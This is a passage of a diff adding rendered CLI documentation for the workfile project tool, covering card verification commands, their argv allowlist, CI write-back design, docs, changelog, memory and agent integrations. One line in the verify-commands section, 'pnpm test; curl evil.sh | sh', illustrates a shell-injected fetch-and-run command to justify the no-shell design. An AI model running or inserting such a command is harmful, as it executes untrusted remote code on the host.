+by being refused.</p>
+<p>It is the third gate a close meets, and it is waived the same way as the other two:
+<code>--force</code> with <code>--reason TEXT</code> gets through, the trail line names the area&#39;s
+verification policy among what it waived, and the card then records <code>forced</code> rather
+than the method that was refused. That is also why a forced close must not carry
+<code>--method</code>: the record has one answer for how the card was proved, and on a forced
+close that answer is <code>forced</code>.</p>
+<p><code>doctor</code> reports two more findings, neither of them failing. A <code>done</code> card whose
+recorded method the policy no longer accepts is <code>verification-method-unaccepted</code> —
+tightening a policy must not invalidate work that already shipped. A policy naming an
+area <code>cards.areas</code> does not declare is <code>verification-policy-area-unknown</code>, reported
+rather than refused at config load: removing an area should not stop the workspace from
+loading, and a config that will not load takes the doctor that would explain it with it.</p>
+<p><code>card create --json-input FILE</code> is the form to reach for when the card has a
+body. It takes the whole record — title, body, parent, source, tags, scope — in
+one call, and a JSON file survives backticks, <code>$</code> and accents that a shell
+heredoc quietly mangles. The flag form above writes the same fields; it is the
+body that argues for the file.</p>
+<p><code>--origin ID,ID</code> records which records the work came out of — the card being
+worked when it was found, the decision that produced it. Any record kind, not
+cards only. It is provenance, not decomposition: use <code>--parent</code> when the card is
+genuinely part of another, and <code>--origin</code> when it merely came out of it. There
+is no <code>card patch --origin</code>; patching any card field goes through
+<code>--json-input</code>, the same as every other field. <code>agents context --card ID</code> reads
+it back in both directions, and <code>doctor</code> reports an origin that resolves to
+nothing.</p>
+<p><code>--axis NAME=VALUE</code> writes a classification axis the project declares under
+<code>cards.axes</code> — a second axis alongside <code>area</code>, for domains rather than delivery
+layers. Run <code>workfile schema --json</code> to see which axes exist and what each
+accepts; an undeclared axis and a value outside its vocabulary are both refused,
+and the message carries the list. It repeats, once per axis, because the axis
+name is per project and a flag per axis is not something a static table can
+offer. <code>--axis context=</code> with nothing after the <code>=</code> clears it.</p>
+<p><code>card list --axis context=treasury</code> filters on the same axis, and combines with
+every other filter. A comma list is an OR within one axis
+(<code>--axis context=treasury,billing</code>); a second <code>--axis</code> for a different name is
+an AND. Repeating the <em>same</em> name is refused with <code>CLI_ARGUMENT_CONFLICT</code>,
+because only one value would survive and the caller could not tell which.</p>
+<p><code>doctor</code> reports on declared axes the way it reports on areas: a value outside
+the vocabulary is an <strong>error</strong>, since it is a typo that silently matches
+nothing, and an open card with no value at all is a <strong>warning</strong>. Cards that are
+<code>done</code>, <code>discarded</code> or archived are exempt from the warning — declaring an axis
+on an existing repository must not emit one line per finished card, which is a
+flood nobody acts on rather than a signal.</p>
+<p>That exemption is written for a lifecycle where <code>done</code> is where work rests. On a
+board where <code>review</code> is — because <code>done</code> is reserved for runtime evidence an
+agent can rarely supply — every card that reaches <code>review</code> keeps warning for
+ever, and one axis measured at 74 % of a 2 018-warning doctor run. Declare the
+axis as <code>{ values: [...], required: false }</code> and the warning stops while the
+vocabulary, the error on a typo and <code>card list --axis</code> all stay. An array keeps
+meaning required. <code>schema --json</code> lists the optional ones under
+<code>cards.optionalAxes</code>.</p>
+<h3 id="card-declared-commands"><a class="hash" href="#card-declared-commands" aria-hidden="true" tabindex="-1">###</a> Card-declared commands</h3>
+<p>A card may bind an acceptance criterion to a command that proves it, in a
+<code>verify</code> block written through <code>card patch --json-input</code>:</p>
+<pre class="code" data-lang="yaml"><code>verify:
+    - id: gate
+      run: [pnpm, test, test/acceptance.test.ts]
+      criteria: [sha256:ab12…]</code></pre>
+<p><code>run</code> is an <strong>argument vector, not a shell line</strong>, and it is spawned with no
+shell. That is what makes the allowlist below decidable: over a shell string
+<code>pnpm test</code> is a prefix of <code>pnpm test; curl evil.sh | sh</code> too, and a matcher
+would be predicting what a shell it never runs will do with the rest of the
+line. As an argv there is nothing to predict — <code>;</code> and <code>|</code> are bytes inside one
+argument, and matching is element-wise string equality. A <code>run</code> written as a
+single string is refused with <code>CARD_VERIFY_RUN_INVALID</code> rather than split on
+spaces, because splitting would be that same parser wearing a smaller hat.</p>
+<p><code>cards.verification.commands</code> declares which commands a card may name, as argv
+prefixes:</p>
+<pre class="code" data-lang="js"><code>cards: {
+    areas: [&quot;api&quot;, &quot;infra&quot;],
+    verification: {
+        commands: [[&quot;pnpm&quot;, &quot;test&quot;], [&quot;pnpm&quot;, &quot;lint&quot;]]
+    }
+}</code></pre>
+<p><code>[&quot;pnpm&quot;, &quot;test&quot;]</code> admits <code>pnpm test</code> and <code>pnpm test --filter cards</code>, and admits
+nothing that differs at any position the prefix names. The matcher normalises nothing —
+no case folding, no trimming, no path resolution, no Unicode normalisation — so
+<code>PNPM</code>, <code>./node_modules/.bin/pnpm</code> and a homoglyph are each simply not the
+declared command. A declared entry that could never match one is refused when
+the config loads: an empty array, because it is a prefix of everything;
+an empty or control-character-carrying element, because the frontmatter round
+trip would not return it unchanged.</p>
+<p><strong>The list is empty by default, so a project that declares nothing can run
+nothing.</strong> A card naming an undeclared command is refused with
+<code>CARD_VERIFY_COMMAND_NOT_ALLOWED</code>, and the message names
+<code>cards.verification.commands</code> when the project has declared none.</p>
+<p><code>doctor</code> runs the same check on read and reports <code>verify-command-not-allowed</code>
+as an <strong>error</strong>. That is the half that matters in a repository taking pull
+requests: a card is a Markdown file, so one can arrive as a file in a diff
+without ever calling a mutation, and the write-time refusal never runs. <code>doctor --json</code> is what the generated CI workflow exists to run, so the error is what
+turns the pull request red.</p>
+<p>Be clear about what the allowlist buys. It bounds which command a card may
+name; it cannot bound what that command does, because every command worth
+allowing dispatches through a file the same pull request can edit — <code>pnpm test</code>
+reads <code>package.json</code>, <code>make check</code> reads the Makefile. It is anti-escalation on
+a branch you trust, and it makes a declared command reviewable in one place.
+Containment for a branch you do not trust is a different control entirely, and
+belongs to the job rather than to the card: no secrets, no write token, and no
+evidence written back from a head you did not review.</p>
+<p>A card that already carries a command the project refuses is refused every
+write until the block goes, so it cannot be quietly closed around. Clear it and
+then move the card:</p>
+<pre class="code" data-lang="sh"><code>printf '{&quot;verify&quot;: null}' | workfile card patch T-0042 --json-input -
+workfile card transition T-0042 discarded</code></pre>
+<h3 id="running-them"><a class="hash" href="#running-them" aria-hidden="true" tabindex="-1">###</a> Running them</h3>
+<pre class="code" data-lang="bash"><code>workfile card verify ID [--only ENTRY,ENTRY] [--actor ACTOR] [--json]</code></pre>
+<p>Runs each declared entry and reports pass or fail per entry, then checks the
+criteria the passing entries prove. It is the only thing that can: a bound
+criterion is one <code>card ac --check</code> refuses, so without this command a card that
+binds its criteria is a card nothing can close.</p>
+<p>Each <code>run</code> is spawned as an argument vector with <strong>no shell</strong>, from the
+workspace root, with stdin closed — a command that stops to ask a question would
+otherwise wait for a terminal nobody is watching. Entries run one at a time:
+two declared commands are usually two suites over one working tree, and
+deciding a project&#39;s build is safe to run twice at once is not this tool&#39;s call
+to make on its behalf. <code>--only</code> runs a subset, <code>--json</code> prints the whole report,
+and the command exits <code>1</code> unless every entry that ran passed.</p>
+<p><strong>What a run writes, and what it does not.</strong> A criterion&#39;s box records what a
+command decided, so only a command that decided something writes one:</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Outcome</th>
+<th>Means</th>
+<th>The bound criteria</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>passed</code></td>
+<td>Exit <code>0</code>.</td>
+<td>Checked.</td>
+</tr>
+<tr>
+<td><code>failed</code></td>
+<td>Any other exit status.</td>
+<td>Unchecked — a proof that no longer reproduces is not a proof.</td>
+</tr>
+<tr>
+<td><code>timed-out</code></td>
+<td>Killed at <code>cards.verification.timeoutSeconds</code>.</td>
+<td>Untouched.</td>
+</tr>
+<tr>
+<td><code>errored</code></td>
+<td>Never started: no such command, not executable.</td>
+<td>Untouched.</td>
+</tr>
+</tbody></table></div>
+<p>The last two are deliberate and are not a smaller version of <code>failed</code>. Killing a
+command at the timeout is us giving up and a machine with no such command has
+decided even less; neither is a fact about the criterion. Unchecking there would
+let a run on the wrong machine erase a proof a right one produced, and the
+criterion is machine-owned, so <code>card ac --check</code> could not put it back. Both
+still exit <code>1</code>, and both print why.</p>
+<p>An entry that changes a criterion&#39;s state leaves a line on the card&#39;s trail
+naming it, because a box that moved because a subprocess exited otherwise has no
+author in the record at all:</p>
+<pre class="code" data-lang="text"><code>- 2026-08-06 09:12Z alice@studio · verify gate: pnpm test acceptance passed, checked #1, #3
+- 2026-08-06 11:40Z alice@studio · verify gate: pnpm test acceptance failed (exit 1), unchecked #1, #3</code></pre>
+<p>A run that changed nothing writes no line, the same rule a repeated
+<code>card transition</code> follows. <code>--actor</code> names who ran it, defaulting the way every
+other card command&#39;s does.</p>
+<p><strong>There is no <code>--dry-run</code>, and it is refused rather than ignored.</strong> The flag
+previews filesystem changes, and a run that spawns every declared command and
+then skips the write-back has already done the part worth previewing.
+<code>workfile card show ID --json</code> reports the <code>verify</code> block, which is what looking
+first means here.</p>
+<p>The commands run <strong>outside</strong> the card&#39;s write lock — they take minutes, and a
+lock held across them would block every note, claim and status move for as long
+as a suite runs. The card is read again after the last command exits and the
+bindings are resolved against <em>that</em> reading, so a criterion reworded while the
+tests were running is no longer bound to the entry and the write is refused by
+name rather than applied to whatever line moved into that position.</p>
+<p>How long a command gets is the project&#39;s to declare:</p>
+<pre class="code" data-lang="js"><code>cards: {
+    verification: {
+        commands: [[&quot;pnpm&quot;, &quot;test&quot;]],
+        timeoutSeconds: 600
+    }
+}</code></pre>
+<p>Ten minutes by default, between 1 second and 12 hours, and there is no way to
+say &quot;no timeout&quot;: a command that never exits would otherwise hold an unattended
+CI job forever. <code>workfile schema --json</code> reports the effective value under
+<code>cards.verification</code>.</p>
+<p><strong>On Windows, a <code>.cmd</code> shim cannot be started without a shell.</strong> <code>pnpm</code>, <code>npm</code>
+and everything in <code>node_modules/.bin</code> are <code>.cmd</code> files there, and Node refuses
+to spawn one unless a shell parses the line — which is the thing the argv model
+exists to avoid. Such an entry reports <code>errored</code> and changes nothing, on that
+platform only. Declare something Windows can start directly, such as
+<code>[&quot;node&quot;, &quot;node_modules/vitest/vitest.mjs&quot;, &quot;run&quot;]</code>.</p>
+<p>This is a CLI command and has no MCP tool or HTTP route. Executing a card&#39;s
+commands is something a person asks for at a terminal, and a tool that let an
+agent trigger it over a long-lived server connection is a wider decision than
+the one this implements.</p>
+<p>Claims carry an actor and optional path scope; the server refuses overlapping
+scopes and releases the claim when a card leaves <code>doing</code>.</p>
+<p>Sequential IDs are allocated per clone, so two branches can mint the same ID and
+git merges both files without a conflict. Cards are the least exposed kind: a
+card is created once, by whoever picks up the work, while a changelog fragment
+is written by <em>every</em> branch that changes anything user-visible. <code>doctor --fix</code>
+heals all of them — cards, changelog fragments, managed documents and memory
+records — and picks the same survivor on every clone: the oldest <code>created</code> keeps
+the ID and the rest move to the next free one, ties broken by path. A released
+fragment is the exception and always keeps it, because a fragment cut into a
+version is frozen and the release record lists it by ID. <code>card renumber --duplicates</code> stays card-scoped and reports every other collision under
+<code>skipped</code>.</p>
+<p>When the moved ID was unique, every reference inside <code>.project/</code> is rewritten;
+after a collision the references are ambiguous by construction, so they are
+listed under <code>review</code> instead of being silently repointed. Only the ID half of
+the filename moves — the title slug survives — and <code>doctor --fix</code> brings a
+card&#39;s slug back in step afterwards, which it does not do for the other kinds.</p>
+<p>A collision is refused rather than repaired when moving a record would not be
+the correction — two <em>released</em> fragments carrying one ID (describe it in a new
+fragment instead), a release record, an indexed file outside <code>docs.managedPath</code>
+declaring a managed ID in its frontmatter, or one ID spanning two record kinds.
+For each of those <code>doctor --fix</code> prints a <code>cannot fix:</code> line naming the reason
+and the run still exits <code>1</code>, because the error is still there.</p>
+<p>Filter flags take comma-separated values (<code>--type bug,task</code>) and combine with
+AND. <code>--json</code> omits the Markdown body and reports <code>bodyBytes</code> instead; ask for
+it with <code>--with-body</code>, or pick exactly what you need with <code>--fields</code>. Responses
+carry <code>total</code>, <code>offset</code> and <code>truncated</code>.</p>
+<p><code>show</code> takes <code>--fields</code> too, on every record kind: <code>card show T-0042 --json --fields id,revision</code> is how a caller obtains the revision a guarded patch needs
+without reading the body first. Keys the record does not carry are left out
+rather than reported as null. A patch without <code>--expected-revision</code> applies and
+says nothing — the guard is optional by design, and the patch&#39;s own <code>--json</code>
+answer already carries the new revision.</p>
+<p>Options are validated per <strong>subcommand</strong>, not per command word. <code>card show --status doing</code> and <code>card patch ID --json-input p.json --title &quot;...&quot;</code> are
+refused with <code>CLI_ARGUMENT_UNKNOWN</code>, and the message names the subcommand the
+flag does belong to. They used to exit 0 having silently dropped the flag, which
+an agent cannot detect.</p>
+<p>An option given twice is refused with <code>CLI_ARGUMENT_CONFLICT</code>, because only the
+first occurrence is read — pass a list as one comma-separated value. <code>card ac --check</code>, <code>--uncheck</code> and <code>card create|patch --axis</code> are the exceptions and may
+repeat, because something reads every occurrence.</p>
+<p>Only <code>--root</code>, <code>--json</code>, <code>--dry-run</code> and <code>--allow-new</code> are global.</p>
+<p>A value a filter cannot parse is refused with <code>CLI_OPTION_INVALID</code>, never
+applied as a filter that matches nothing. <code>--updated-since</code> takes <code>YYYY-MM-DD</code>
+(an RFC 3339 timestamp is accepted and read as its date); <code>--limit</code>, <code>--offset</code>,
+<code>--max-issues</code>, <code>--older-than</code>, <code>--occurrences</code> and <code>--port</code> take whole numbers.
+<code>--updated-since 2026-7-1</code> used to exit 0 with <code>&quot;total&quot;: 0</code>, and <code>--limit abc</code>
+to return an empty page under a non-zero <code>total</code>.</p>
+<p>A claim has a lifecycle, not just a flag. The card records <code>claimed_by</code> and
+<code>claimed_at</code>; the live signal lives in <code>.project/.cache/activity/sessions/</code> and
+therefore outside git, because a heartbeat written into frontmatter would leave
+the working tree permanently dirty. <code>doctor</code> reports <code>card-claim-stale</code> past
+<code>cards.claimLeaseHours</code> and <code>card-claim-orphaned</code> when a session stops
+signalling, and <code>workfile card reap</code> releases them.</p>
+<h3 id="what-produced-a-write"><a class="hash" href="#what-produced-a-write" aria-hidden="true" tabindex="-1">###</a> What produced a write</h3>
+<p>The trail says who and when; <code>produced_by</code> says what. Declare it and every card
+write records it beside the actor — as a <code>via:MODEL/REASONING</code> token on the
+trail line and as a <code>produced_by</code> block in frontmatter, so <code>card list --json</code>
+can be counted over by model without parsing prose:</p>
+<pre class="code" data-lang="sh"><code>WORKFILE_MODEL=claude-opus-4-1 WORKFILE_REASONING=high workfile card transition T-0042 review
+# - 2026-09-11 18:40Z alvaro@local#597ecdc9 via:claude-opus-4-1/high · doing → review</code></pre>
+<p>It is <strong>self-reported</strong> and the block says so (<code>basis: self-reported</code>): an
+agent can set an environment variable to anything, so read it as a label the
+writer chose, never as an attestation. The halves come from, in order,
+<code>WORKFILE_MODEL</code> then <code>ANTHROPIC_MODEL</code>; <code>WORKFILE_REASONING</code> then
+<code>CLAUDE_EFFORT</code> (which Claude Code exports to the Bash tool and to hooks) then
+<code>CLAUDE_CODE_EFFORT_LEVEL</code>; and last the session file the Claude hook writes,
+which carries <code>model</code> when a <code>SessionStart</code> payload included it and
+<code>effort.level</code> from every tool call. A half nobody declared is written as
+<code>undeclared</code>. A value that is not a label — more than 64 characters, or outside
+<code>[A-Za-z0-9._:+-]</code> — is refused with a note on stderr and the write records
+<code>undeclared</code> instead, which is what keeps the field from carrying anything but
+a name. With nothing declared the record is byte-identical to today, and the
+block is the last writer <em>that declared</em>: a write with no declaration puts no
+token on its trail line and leaves the block alone, so a human&#39;s note after an
+agent&#39;s close does not erase which model closed it. <code>claimed_by</code> and the
+guard&#39;s actor comparison are untouched either way.</p>
+<h2 id="docs"><a class="hash" href="#docs" aria-hidden="true" tabindex="-1">##</a> Docs</h2>
+<pre class="code" data-lang="bash"><code>workfile doc list [--query TEXT] [--managed] [--json]
+workfile doc show ID [--json]
+workfile doc create --title TITLE [--kind KIND] [--status STATUS] [--folder PATH]   # TITLE up to 120 characters
+workfile doc create --json-input FILE   # recommended: body and metadata in one call
+workfile doc move ID --folder PATH [--expected-revision REV]
+workfile doc patch ID --json-input FILE [--expected-revision REV]
+workfile doc write ID [--body-file FILE] [--expected-revision REV]   # or pipe the body on stdin
+workfile doc note ID --text TEXT [--section NAME] [--actor ACTOR]</code></pre>
+<p><code>doc write</code> replaces the body and leaves the frontmatter as it is; <code>doc note</code>
+appends one timestamped, attributed line under a heading, creating it when
+absent. They are the document forms of <code>card write</code> and <code>card note</code>, and exist
+because <code>doc patch</code> takes the body as one field among the rest — so before them
+the only way to change a paragraph of a document edited over hours was to keep a
+working copy outside the repository and send the whole body back each time.</p>
+<p>A card title is refused past 80 characters and a document title past 120, before
+anything is written. <code>workfile schema --json</code> reports both under
+<code>cards.limits.title</code> and <code>docs.limits.title</code>, so a caller composing a record can
+read the bound instead of meeting it; the refusal says how long the title was.</p>
+<p>Indexed documents (from configured globs) get deterministic <code>PATH-*</code> IDs and are
+read-only; managed documents live in <code>.project/docs/</code> with <code>DOC-NNNN</code> IDs.</p>
+<p>Managed documents are loaded recursively, so folders work even when they are
+created by hand. <code>docs.layout</code> decides where new documents are written — <code>kind</code>
+(the default) groups them into a folder named after the document kind, <code>flat</code>
+uses the managed root — and <code>--folder PATH</code> overrides it for a single command.
+The path must stay inside <code>docs.managedPath</code>; <code>--folder &quot;&quot;</code> targets the root.
+<code>workfile doc move</code> relocates a document without changing its ID or its content.</p>
+<h2 id="history-changelog"><a class="hash" href="#history-changelog" aria-hidden="true" tabindex="-1">##</a> History (changelog)</h2>
+<pre class="code" data-lang="bash"><code>workfile changelog list [--unreleased] [--visibility public|internal] [--json]
+workfile changelog show ID [--json]
+workfile changelog add --title TITLE [--type fixed] [--area AREA]
+workfile changelog add --json-input FILE   # recommended: body and metadata in one call
+workfile changelog patch ID --json-input FILE [--expected-revision REV]
+workfile changelog preview [--fragments CHG-0001,CHG-0002]
+workfile changelog release VERSION [--fragments CHG-0001,CHG-0002] [--title TITLE]
+workfile changelog release VERSION --amend [--title TITLE] [--date YYYY-MM-DD]   # newest release only
+workfile changelog release VERSION --amend --drop CHG-0002   # a fragment cut by mistake goes back to unreleased
+workfile changelog render [--visibility public|internal] [--write]
+workfile changelog verify</code></pre>
+<p>Release version validation follows <code>changelog.releaseStrategy</code>: <code>semver</code>,
+<code>calendar</code> or <code>freeform</code>.</p>
+<p><code>--amend</code> corrects the newest release only. It changes <code>--title</code>, <code>--date</code>,
+<code>--commit</code>, <code>--body</code> and <code>--tags</code>, and refuses <code>--fragments</code> rather than
+ignoring it. <code>--drop CHG-…</code> is the one change it makes to what a release
+consumed: the fragment&#39;s file moves back to <code>unreleased/</code>, its id leaves the
+release record, and a rendered changelog that exists is rewritten — so a
+duplicate cut into a release no longer needs git to undo (T-0253). An id whose
+file is already gone is only taken off the list, which repairs
+<code>release-missing-fragment</code>. A release keeps at least one fragment.</p>
+<p><code>changelog verify</code> diagnoses the changelog the way <code>doctor</code> does — the same
+issues under the same codes, <code>release-missing-fragment</code> included — and exits 1
+when any of them is an error, with <code>--json</code> as well as without. It used to read
+an index nobody had diagnosed and answer <code>0 errors</code> on any tree (T-0252).</p>
+<h2 id="memory"><a class="hash" href="#memory" aria-hidden="true" tabindex="-1">##</a> Memory</h2>
+<pre class="code" data-lang="bash"><code>workfile memory list [--collection learnings] [--status active] [--json]
+workfile memory show ID [--json]
+workfile memory add COLLECTION --title TITLE [--status STATUS]
+workfile memory add COLLECTION --json-input FILE   # recommended: body and metadata in one call
+workfile memory patch ID --json-input FILE [--expected-revision REV]
+workfile memory graduate ID --to CONV-0001,DOC-0001
+workfile memory supersede ID --by ID
+workfile memory verify   # the same verdict and exit code as changelog verify, for memory</code></pre>
+<p><code>add</code> accepts singular aliases (<code>learning</code>, <code>decision</code>, <code>incident</code>, <code>convention</code>,
+<code>context</code>) as well as collection ids. Collections and prefixes:</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Collection</th>
+<th>Prefix</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>learnings</td>
+<td><code>LRN</code></td>
+<td>Reusable observations with confidence and occurrences</td>
+</tr>
+<tr>
+<td>decisions</td>
+<td><code>ADR</code></td>
+<td>Proposed / accepted / rejected / superseded decisions</td>
+</tr>
+<tr>
+<td>incidents</td>
+<td><code>INC</code></td>
+<td>Operational events with severity and resolution metadata</td>
+</tr>
+<tr>
+<td>conventions</td>
+<td><code>CONV</code></td>
+<td>Durable rules for humans and agents</td>
+</tr>
+<tr>
+<td>context</td>
+<td><code>CTX</code></td>
+<td>Useful but potentially expiring project state</td>
+</tr>
+</tbody></table></div>
+<h2 id="agents"><a class="hash" href="#agents" aria-hidden="true" tabindex="-1">##</a> Agents</h2>
+<pre class="code" data-lang="bash"><code>workfile agents sync [--targets agents-md,claude,cursor,copilot]
+workfile agents check [--targets ...]
+workfile agents context --card T-0001 [--limit 20]
+workfile agents whoami [--json]</code></pre>
+<p><code>sync</code> writes compact managed blocks (version + SHA-256 digest) into <code>AGENTS.md</code>,
+<code>CLAUDE.md</code>, <code>.cursor/rules/</code> or <code>.github/copilot-instructions.md</code> without touching
+unrelated content. <code>context</code> returns a bounded, prioritized context bundle for a card.</p>
+<p>Accepted decisions and conventions skip the relevance filter, because a rule
+binds work that does not mention it. Past <code>--limit</code> they are not cut: they come
+back under <strong>Also in force</strong> as one titled line each, so a workspace with fifty
+accepted ADRs still hands an agent every ID it must not contradict at a cost of
+a line rather than a summary. Everything else that did not fit is reported as a
+count under <strong>Left out</strong> and reachable through <code>search</code>.</p>
+<p><code>whoami</code> prints the actor every surface attributes mutations to, and which rung
+produced it. Resolution order: an explicit <code>--actor</code>, then <code>$WORKFILE_ACTOR</code>, then
+<code>user@host</code> — discriminated by a short session prefix when a session id is present,
+because two agent sessions in one checkout are two actors and a shared username
+would let them silently take each other&#39;s claims. Set <code>$WORKFILE_ACTOR</code> to pin a
+stable name.</p>
+<h2 id="claude-code"><a class="hash" href="#claude-code" aria-hidden="true" tabindex="-1">##</a> Claude Code</h2>
+<pre class="code" data-lang="bash"><code>workfile claude install [--dry-run] [--force]
+workfile claude check [--json]</code></pre>
+<p><code>install</code> writes the Claude Code surface into the repository — the MCP server
+registration, the slash commands, the skill and the session hooks — as managed
+blocks a later resync updates without touching anything around them. <code>check</code>
+reports which of them are stale and exits <code>1</code> when any is, which is what makes
+it usable in CI. Each stale file is reported with the comparison that failed —
+<code>style</code>, <code>body</code>, <code>digest</code> or <code>trailing-newline</code> — because one of them is
+otherwise invisible: the digest is taken over trimmed bytes, so a file that
+lost its final newline agrees with its own digest and is stale over a byte no
+hash covers.</p>
+<p><code>.mcp.json</code> and <code>.claude/settings.json</code> carry no marker to hold a digest,
+because they are merged into files the repository also owns. They are compared
+against the values an install would write, key by key, using the ledger at
+<code>.project/generated/claude-code.json</code> that records which of them are this
+tool&#39;s — so a hand-edited server registration is reported as
+<code>mcpServers.workfile</code>, and a server the repository added beside it is neither
+compared nor touched.</p>
+<p>The last line of the report is not a file but the command the hooks name,
+resolved. A workspace with the package installed gets
+<code>node node_modules/@illodev/workfile/…/hooks.mjs</code>; one without gets the
+<code>workfile-hooks</code> bin, found on <code>PATH</code>. Either can be <code>unreachable</code>, which is a
+different repair from a stale file: the settings can say exactly what an
+install would write and still name a hook that is not there, and a hook that
+cannot run exits <code>0</code> in silence. It is reported as a warning rather than an
+error, because whether a bin is on <code>PATH</code> is true on one machine and false on
+another.</p>
+<p><code>workfile claude</code> with no subcommand runs <code>check</code>, because reporting is the
+safe default for a word that otherwise writes files.</p>
+<p>Neither command is what installs the <em>package</em> into a Claude Code session:
+a client reads <code>.mcp.json</code> and starts the server itself. See
+<a href="/docs/mcp.md">mcp.md</a> for what <code>install</code> writes and what each hook does.</p>
+<h2 id="ci-templates"><a class="hash" href="#ci-templates" aria-hidden="true" tabindex="-1">##</a> CI templates</h2>
+<pre class="code" data-lang="bash"><code>workfile ci sync [--targets github,gitlab,generic]
+workfile ci check [--targets ...]</code></pre>
+<h3 id="what-the-generated-github-workflow-does-and-what-it-will-not-do"><a class="hash" href="#what-the-generated-github-workflow-does-and-what-it-will-not-do" aria-hidden="true" tabindex="-1">###</a> What the generated GitHub workflow does, and what it will not do</h3>
+<p>Three jobs. <code>doctor</code> validates the protocol. <code>cards</code> runs the commands the cards
+this branch touched declare, and <code>record</code> writes the result back.</p>
+<p>Those last two are deliberately not one job. A criterion bound to a command can
+only be checked by running it, so <code>cards</code> executes commands a pull request
+declared — and therefore holds <code>permissions: {}</code>, with no credentials left in
+<code>.git/config</code>. Writing evidence needs <code>contents: write</code>, so <code>record</code> holds it and
+runs no repository code at all: not even Workfile, because every Workfile command
+<code>import()</code>s <code>project.config.mjs</code> from the checkout. It applies a patch bounded to
+the protocol directory and pushes.</p>
+<p><strong>A fork records nothing.</strong> GitHub issues a read-only token for <code>pull_request</code>
+from a fork, so the push cannot land whatever the workflow says; <code>record</code> also
+declines to start there, in order to say so rather than fail at the last step.</p>
+<p><strong>CI closes a card only when every one of its criteria is bound to a command.</strong> A
+narrative criterion is not something a runner has an opinion about, so a card
+that carries one gets its bound boxes written and stays open, with the reason
+reported. That is the whole safety of the write-back: <code>card ac --check</code> refuses a
+bound criterion and only the runner writes it, so the boxes CI touches are boxes
+no person was going to check either way.</p>
+<p><strong>Only on a pull request.</strong> &quot;The cards this branch touched&quot; is a diff against a
+base and a push to a default branch has none. The checkout needs
+<code>fetch-depth: 0</code>, because the diff is taken from the merge base and a shallow
+clone has none — reported as <em>cannot answer</em> rather than as an empty diff, which
+would turn &quot;nothing was verified&quot; into &quot;there was nothing to verify&quot;.</p>
+<p><code>--base</code> is required and has no default. Guessing it wrong means running the
+declared commands of cards the branch never opened, and writing to them.</p>
+<p><strong>GitLab and the generic script run no card commands.</strong> GitLab has no per-job
+permission scope, so the job sees every unprotected variable in the project and
+there is nowhere to put a command a merge request declared; the generic script
+inherits the whole environment of whatever invokes it. Both files carry the
+invocation commented out with what a maintainer would have to arrange first.</p>
+<h2 id="legacy-migration"><a class="hash" href="#legacy-migration" aria-hidden="true" tabindex="-1">##</a> Legacy migration</h2>
+<pre class="code" data-lang="bash"><code>workfile migrate plan [--source .planning] [--mode copy|move]
+workfile migrate apply [--source .planning] [--mode copy|move] [--force]
+workfile migrate schema [--dry-run] [--json]</code></pre>
+<p>Valid v1 cards become canonical v2 records; everything else is preserved under
+<code>.project/sources/legacy-planning/</code> with a written migration report.</p>
+<p><code>migrate schema</code> is a different job: it moves a workspace forward when the
+installed package expects a newer <code>schemaVersion</code> than <code>.project/VERSION</code>
+declares. Steps run in ascending order under a lock, <code>--dry-run</code> prints the plan
+without writing, and the result is recorded in <code>.project/migrations/schema.json</code>
+along with <code>upgradedWith</code> in <code>.project/VERSION</code>. A workspace <em>newer</em> than the
+package is refused with <code>WORKSPACE_SCHEMA_AHEAD</code> — upgrade the package instead.</p>
+<h2 id="mcp"><a class="hash" href="#mcp" aria-hidden="true" tabindex="-1">##</a> MCP</h2>
+<pre class="code" data-lang="bash"><code>workfile mcp [serve] [--read-only]
+workfile mcp inspect [--json]
+workfile mcp config [--read-only] [--json]</code></pre>
+<p>See <a href="/docs/mcp.md">mcp.md</a> for the server contract.</p>
+</article>
+<p class="source">Generated from <a href="https://github.com/illodev/workfile/blob/main/packages/workfile/docs/cli.md">packages/workfile/docs/cli.md</a>.</p>
+</main>
+</div>
+<footer class="foot"><div class="foot-in"><span>MIT © illodev — the repository is the database</span><a href="/">home</a><a href="/llms.txt">llms.txt</a><a href="https://github.com/illodev/workfile">github</a><a href="https://www.npmjs.com/package/@illodev/workfile">npm</a></div></footer>
+</body>
+</html>
